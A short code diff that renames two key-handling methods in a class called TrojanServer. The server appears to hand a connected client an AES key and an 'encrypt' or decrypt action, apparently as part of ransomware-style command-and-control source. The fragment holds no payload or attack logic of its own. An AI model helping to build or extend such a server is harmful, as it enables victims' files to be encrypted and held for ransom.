@@ -92,9 +92,9 @@ class TrojanServer:
 
     def handle_client(self):
         if self.action == "encrypt":
-            aes_key = self.generate_and_store_key()
+            aes_key = self.generate_and_store_aes_key()
         else:
-            aes_key = self.load_and_decrypt_key()
+            aes_key = self.retrieve_aes_key()
 
         protocol.send(self.conn, aes_key)
         protocol.send(self.conn, self.action)
